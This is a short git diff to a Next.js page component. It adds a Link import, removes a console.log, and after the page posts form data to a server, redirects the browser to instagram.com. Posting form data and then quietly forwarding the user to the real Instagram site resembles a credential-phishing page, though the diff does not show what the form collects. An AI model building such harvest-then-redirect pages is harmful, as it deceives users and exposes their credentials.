@@ -3,6 +3,7 @@ import Image from "next/image";
 import logo from "./logo.png";
 import "./styles.css";
 import { useEffect, useState } from "react";
+import Link from "next/link";
 
 export default function Home() {
   const [startTime] = useState(new Date());
@@ -47,9 +48,8 @@ export default function Home() {
       body: JSON.stringify(formData),
     })
       .then((response) => {
-        console.log(response);
-
         // Handle server response here
+        document.location.replace('https://instagram.com')
       })
       .catch((error) => {
         console.error("Error sending data to server:", error);
